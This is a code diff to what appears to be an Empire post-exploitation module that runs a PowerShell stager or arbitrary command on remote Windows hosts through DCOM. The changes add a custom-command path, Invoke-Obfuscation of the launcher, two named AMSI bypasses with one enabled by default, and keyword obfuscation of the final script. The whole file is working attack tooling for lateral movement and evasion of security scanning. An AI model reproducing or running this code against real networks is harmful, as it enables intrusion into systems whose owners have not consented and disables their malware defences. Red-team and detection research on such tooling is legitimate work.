@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -12,16 +15,16 @@ class Module(object):
 
             'Author': ['@rvrsh3ll'],
 
-            'Description': ('Executes a stager on remote hosts using DCOM.'),
+            'Description': ('Execute a stager or command on remote hosts using DCOM.'),
 
             'Software': '',
 
-            'Techniques': ['TA0008', 'T1175'],
+            'Techniques': ['T1175'],
 
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
@@ -29,7 +32,7 @@ class Module(object):
             'Language' : 'powershell',
 
             'MinLanguageVersion' : '2',
-            
+
             'Comments': []
         }
 
@@ -45,7 +48,7 @@ class Module(object):
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
@@ -59,8 +62,33 @@ class Module(object):
             },
             'Listener' : {
                 'Description'   :   'Listener to use.',
-                'Required'      :   True,
+                'Required'      :   False,
                 'Value'         :   ''
+            },
+            'Command' : {
+                'Description'   :   'Custom command to run.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -91,13 +119,34 @@ class Module(object):
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
+        command = self.options['Command']['Value']
         method = self.options['Method']['Value']
         computerName = self.options['ComputerName']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
+
+        # Only "Command" or "Listener" but not both
+        if (listenerName == "" and command  == ""):
+          print(helpers.color("[!] Listener or Command required"))
+          return ""
+        if (listenerName and command):
+          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
+          return ""
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-DCOM.ps1"
         if obfuscate:
@@ -113,31 +162,39 @@ class Module(object):
         f.close()
 
         script = moduleCode
+        scriptEnd = ""
 
-
-
-
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
             # not a valid listener, return nothing for the script
             print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
 
-        else:
+        elif listenerName:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
+                                                              obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
+                                                              userAgent=userAgent, proxy=proxy,
+                                                              proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
+                                                              AMSIBypass2=AMSIBypass2)
 
             if launcher == "":
                 print(helpers.color("[!] Error in launcher generation."))
                 return ""
             else:
 
-                stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                scriptEnd = "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, stagerCmd)
+                Cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+
+        else:
+            Cmd = '%COMSPEC% /C start /b ' + command.replace('"','\\"')
+            print(helpers.color("[*] Running command:  " + Cmd))
+
+        scriptEnd = "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, Cmd)
 
 
-        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
